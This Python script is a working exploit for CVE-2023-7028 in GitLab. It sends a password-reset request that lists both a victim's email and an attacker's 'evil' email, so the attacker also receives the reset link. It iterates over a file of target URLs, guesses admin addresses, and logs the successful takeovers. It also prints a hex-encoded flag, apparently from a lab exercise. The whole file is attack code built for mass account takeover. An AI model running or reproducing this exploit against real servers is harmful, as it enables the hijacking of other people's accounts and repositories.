import requests
import argparse
from urllib.parse import urlparse, urlencode
import re
import tldextract

requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        # Retry mechanism with a maximum of 2 retries
        max_retries = 2
        for attempt in range(1, max_retries + 1):
            try:
                print(f'[{self.url.scheme}] Getting authenticity_token (Attempt {attempt}/{max_retries}) ...')
                html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False, timeout=5).text
                regex = r'<meta name="csrf-token" content="(.*?)" />'
                token = re.findall(regex, html)[0]
                print(f'[{self.url.scheme}] authenticity_token = {token}')
                return token
            except Exception as e:
                print(f'[{self.url.scheme}] Retry {attempt}/{max_retries} - Error: {e}')

        print(f'[{self.url.scheme}] Maximum retries reached. Failed ... quitting')
        return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False
        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)
        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        # Retry mechanism with a maximum of 2 retries
        max_retries = 2
        for attempt in range(1, max_retries + 1):
            try:
                print(f'[{self.url.scheme}] Sending reset password request (Attempt {attempt}/{max_retries})')
                response = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                                       data=query_string,
                                       headers=head,
                                       verify=False,
                                       timeout=5)  # Adjust the timeout value as needed
                html = response.text
                sended = 'If your email address exists in our database' in html
                if sended:
                    print(f'[{self.url.scheme}] Emails sent to {self.target} and {self.evil} !')
                    print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
                else:
                    print(f'[{self.url.scheme}] Failed ... quitting')
                return sended
            except requests.RequestException as e:
                print(f'[{self.url.scheme}] Retry {attempt}/{max_retries} - Error: {e}')
        
        print(f'[{self.url.scheme}] Maximum retries reached. Failed ... quitting')
        return False


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-f", "--file", dest="file", type=str, required=True,
                        help="Path to the file containing URLs and target emails.")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-u", "--username", dest="username", default="admin", type=str, required=False, help="Username")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    parser.add_argument("-o", "--output_file", dest="output_file", default="success_log.txt", type=str,
                        help="Path to the file where successful results will be logged.")
    return parser.parse_args()

def write_success_log(entry, file_path):
    with open(file_path, 'a') as success_file:
        success_file.write(f"Successful reset for: {entry}\n")

def normalize_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        return 'http://' + url
    return url

def extract_subdomain(url):
    print(f"Extracting domain from {url}")
    # Extract domain from URL
    domain_match = re.match(r'https?://(?:www\.)?([^:/]+)', url)
    if domain_match:
        domain_parts = tldextract.extract(domain_match.group(1))
        return domain_parts.domain + '.' + domain_parts.suffix
    return None

if __name__ == '__main__':
    args = parse_args()

    # Read the URL list from the specified file
    try:
        with open(args.file, 'r') as file:
            url_list = file.read().strip().split('\n')
    except FileNotFoundError:
        print(f"Error: File '{args.file}' not found.")
        exit()

    for url_entry in url_list:
        # Split each entry by semicolon to get URL and target email
        entry_parts = url_entry.split(';')
        
        # Use default email if not provided
        url = normalize_url(entry_parts[0].strip())
        subdomain = extract_subdomain(url)
        print(f"Extracted subdomain: {subdomain}")
        target = entry_parts[1].strip() if len(entry_parts) > 1 else f'{args.username}@{subdomain}' if subdomain else f'{args.username}@{urlparse(url).hostname}'
        print(f"Target email: {target}")
        print(f"Evil email: {args.evil}")
    
        exploit = CVE_2023_7028(
            url=url,
            target=target,
            evil=args.evil
        )
        if exploit.ask_reset():
            print(f"Success! Password reset for {url_entry}")
            write_success_log(url_entry, args.output_file)
        else:
            print(f"Failed to reset passwords for {url_entry}. Continuing with the next entry.")
            continue
